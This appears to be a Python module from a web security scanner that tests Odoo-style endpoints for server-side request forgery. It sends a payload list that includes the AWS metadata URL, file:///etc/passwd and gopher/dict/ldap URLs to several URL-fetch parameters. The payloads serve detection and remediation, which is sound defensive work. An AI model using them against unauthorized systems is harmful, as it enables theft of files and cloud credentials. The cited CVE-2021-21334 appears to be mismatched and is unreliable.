"""SSRF checks via website features and outbound fetch handlers."""

from orca.checks.base import BaseCheck
from orca.findings import Severity
from orca.utils.http import is_waf_block_page


# SSRF payloads targeting internal services and protocol handlers
SSRF_PAYLOADS = [
    "http://127.0.0.1:8069",
    "http://localhost:8069",
    "http://0.0.0.0:8069",
    "http://169.254.169.254/latest/meta-data/",  # AWS metadata
    "http://[::1]:8069",
    "file:///etc/passwd",
    "dict://localhost:11211/",
    "ldap://localhost:389/",
    "ftp://localhost:21/",
    "gopher://localhost:9000/",
]

# Endpoints known to fetch remote URLs
SSRF_TARGETS = [
    ("/website_iframe_editor", "u"),
    ("/website_iframe_editor", "url"),
    ("/website_force", "url"),
    ("/website/preview", "url"),
    ("/web/proxy/load", "url"),
    ("/web/proxy/load", "path"),
    ("/web/image", "url"),
    ("/base_import_module/login", "url"),
]


class SSRFCheck(BaseCheck):
    name = "ssrf"
    description = "Test for SSRF via website URL fetch features (CVE-2021-21334)"
    requires_auth = False

    def run(self) -> None:
        self._check_url_fetch_params()
        self._check_website_import()
        self._check_webhook_handlers()

    def _check_url_fetch_params(self) -> None:
        for path, param in SSRF_TARGETS:
            for payload in SSRF_PAYLOADS:
                try:
                    resp = self.target.get(path, params={param: payload}, timeout=10, allow_redirects=False)
                    text = resp.text[:1000]
                    # Look for signs that the URL was actually fetched
                    indicators = [
                        "session_id", "csrf_token", "odoo", "openerp",
                        "root:", "127.0.0.1", "localhost",
                        "ami-id", "instance-id", "meta-data",
                        "Cannot fetch", "Connection refused",
                        "xml version", "database",
                    ]
                    # Skip WAF block pages and server errors — these are false positives
                    if resp.status_code >= 500 or is_waf_block_page(resp):
                        continue
                    if any(ind in text for ind in indicators) and resp.status_code != 403:
                        self.add_finding(
                            title=f"SSRF via {path}?{param}",
                            description=f"The parameter '{param}' on {path} may cause the server to fetch arbitrary URLs. Payload: {payload}",
                            severity=Severity.HIGH,
                            request=f"GET {path}?{param}={payload}",
                            response_snippet=text[:500],
                            response_status=resp.status_code,
                            remediation="Validate and restrict URL parameters to trusted domains. Block private IP ranges, file://, and metadata endpoints.",
                            cwe="CWE-918",
                            references=["https://nvd.nist.gov/vuln/detail/CVE-2021-21334"],
                        )
                        break
                except Exception:
                    pass

    def _check_website_import(self) -> None:
        """Website importers sometimes fetch remote images/URLs."""
        try:
            resp = self.target.get("/website", params={"url": "http://127.0.0.1:8069/web/login"}, timeout=10, allow_redirects=False)
            if resp.status_code == 200 and ("odoo" in resp.text.lower() or "login" in resp.text.lower()):
                self.add_finding(
                    title="SSRF via website URL parameter",
                    description="The /website endpoint may fetch arbitrary URLs via the 'url' parameter, allowing SSRF.",
                    severity=Severity.HIGH,
                    request="GET /website?url=http://127.0.0.1:8069/web/login",
                    response_snippet=resp.text[:400],
                    response_status=resp.status_code,
                    remediation="Block private IP ranges and metadata endpoints in URL parameters.",
                    cwe="CWE-918",
                )
        except Exception:
            pass

    def _check_webhook_handlers(self) -> None:
        """Check for webhook/callback endpoints that make outbound requests."""
        webhook_paths = ["/webhook", "/hooks", "/callback", "/connector"]
        for path in webhook_paths:
            try:
                resp = self.target.options(path, timeout=8)
                if resp.status_code == 200 and ("POST" in resp.headers.get("Allow", "") or "post" in resp.text.lower()):
                    self.add_finding(
                        title=f"Webhook/callback endpoint exposed: {path}",
                        description=f"The endpoint {path} accepts requests and may make outbound calls. Verify it cannot be abused for SSRF.",
                        severity=Severity.LOW,
                        request=f"OPTIONS {path}",
                        response_snippet=resp.text[:300],
                        response_status=resp.status_code,
                        remediation="Validate all outbound URLs in webhook handlers. Implement allowlists.",
                        cwe="CWE-918",
                    )
            except Exception:
                pass
